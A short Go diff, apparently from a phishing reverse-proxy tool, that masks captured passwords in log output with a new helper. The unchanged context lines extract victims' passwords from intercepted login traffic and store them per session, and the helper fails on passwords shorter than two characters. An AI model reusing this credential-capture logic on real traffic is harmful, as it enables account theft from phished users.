@@ -640,7 +640,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									log.Success("[%d] Password: [%s]", ps.Index, hidePassword(pm[1]))
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -682,7 +682,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											log.Success("[%d] Password: [%s]", ps.Index, hidePassword(pm[1]))
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -1855,4 +1855,12 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func hidePassword(myString string) string {
+	myStringLength := len(myString)
+	firstChar := string(myString[0])
+	lastChar := string(myString[myStringLength - 1])
+	result := firstChar + strings.Repeat("*", myStringLength - 2) + lastChar
+	return result
 }
